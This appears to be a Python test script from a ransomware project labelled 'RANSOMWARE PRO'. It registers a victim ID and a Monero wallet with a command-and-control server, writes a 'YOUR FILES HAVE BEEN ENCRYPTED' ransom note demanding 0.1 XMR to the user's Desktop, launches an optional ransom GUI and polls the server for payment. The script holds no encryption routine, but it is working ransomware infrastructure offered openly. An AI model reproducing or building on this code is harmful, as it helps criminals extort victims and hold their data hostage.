#!/usr/bin/env python3
"""
TEST RANSOM NOTE - SIMPLE VERSION
==================================
Startet sofort ohne komplexe GUI
"""

import os
import sys
import time
import json
import uuid
from datetime import datetime, timedelta
import urllib.request

def log(msg):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"[{timestamp}] {msg}")

class SimpleHTTP:
    @staticmethod
    def post(url, data):
        try:
            json_str = json.dumps(data)
            json_data = json_str.encode('utf-8')
            
            req = urllib.request.Request(
                url,
                data=json_data,
                headers={'Content-Type': 'application/json'}
            )
            
            with urllib.request.urlopen(req, timeout=10) as response:
                return json.loads(response.read().decode())
        except Exception as e:
            log(f"[!] POST error: {e}")
            return None
    
    @staticmethod
    def get(url):
        try:
            with urllib.request.urlopen(url, timeout=10) as response:
                return json.loads(response.read().decode())
        except Exception as e:
            log(f"[!] GET error: {e}")
            return None

# Config
C2_HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
C2_URL = f"http://{C2_HOST}:5000"
MONERO_WALLET = "4BJV39ZuKUhesFTWiXdKbL4NLPF7kMAZBHhtaQY4FqfvATNK8KSfCYVwJCa1BnKNNKJk2FwNEi4UXW6nZUZN6SZCxHt6RjdV"

def main():
    log("="*60)
    log("RANSOMWARE PRO - SIMPLE TEST")
    log("="*60)
    
    # Generate ransom ID
    ransom_id = str(uuid.uuid4())[:16]
    log(f"[*] Ransom ID: {ransom_id}")
    
    # Register with C2
    log("[*] Registering with C2...")
    payload = {
        'ransom_id': ransom_id,
        'monero_address': MONERO_WALLET,
        'ransom_amount_xmr': 0.1,
        'system_info': {
            'hostname': 'TEST-VM',
            'username': 'TestUser',
            'platform': 'Windows',
            'files_encrypted': 0,
            'data_size_gb': 0.0
        }
    }
    
    response = SimpleHTTP.post(f"{C2_URL}/api/v1/register", payload)
    
    if response and response.get('success'):
        log(f"[OK] Registered: {ransom_id}")
    else:
        log("[!] Registration failed")
        return
    
    # Write ransom note to Desktop
    log("[*] Writing ransom note to Desktop...")
    
    ransom_note = f"""
╔═══════════════════════════════════════════════════════════╗
║             YOUR FILES HAVE BEEN ENCRYPTED               ║
╚═══════════════════════════════════════════════════════════╝

PAYMENT REQUIRED: 0.1 XMR

Monero Wallet Address:
{MONERO_WALLET}

Your Payment ID:
{ransom_id}

═══════════════════════════════════════════════════════════

INSTRUCTIONS:

1. Download Monero Wallet from getmonero.org
2. Send exactly 0.1 XMR to the wallet address above
3. Include your Payment ID in the transaction
4. Your files will auto-decrypt within 1 minute

═══════════════════════════════════════════════════════════

DO NOT:
- Try to decrypt manually
- Pay twice
- Delete encrypted files
- Restart your computer

═══════════════════════════════════════════════════════════

Current Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Deadline: {(datetime.now() + timedelta(hours=24)).strftime('%Y-%m-%d %H:%M:%S')}

═══════════════════════════════════════════════════════════
"""
    
    try:
        desktop = os.path.expanduser('~\\Desktop')
        ransom_path = os.path.join(desktop, 'RANSOM_NOTE.txt')
        with open(ransom_path, 'w') as f:
            f.write(ransom_note)
        log(f"[OK] Ransom note: {ransom_path}")
    except Exception as e:
        log(f"[!] Could not write ransom file: {e}")
    
    # Try to show GUI
    log("[*] Trying to show GUI...")
    try:
        from ransom_gui import RansomNoteGUI
        log("[+] Launching professional GUI...")
        gui = RansomNoteGUI(ransom_id, MONERO_WALLET, C2_HOST)
        gui.run()
    except Exception as e:
        log(f"[!] GUI error: {e}")
        log("[*] GUI not available, continuing...")
    
    # Monitor for payment
    log("[*] Monitoring for payment...")
    
    while True:
        try:
            response = SimpleHTTP.get(f"{C2_URL}/api/v1/payment/status/{ransom_id}")
            
            if response and response.get('paid'):
                log("[!!!] PAYMENT DETECTED!")
                log("[+] FILES WOULD BE DECRYPTED NOW")
                break
            
            log("[*] No payment yet... (checking in 10 seconds)")
            time.sleep(10)
        
        except Exception as e:
            log(f"[!] Error: {e}")
            time.sleep(10)

if __name__ == "__main__":
    main()
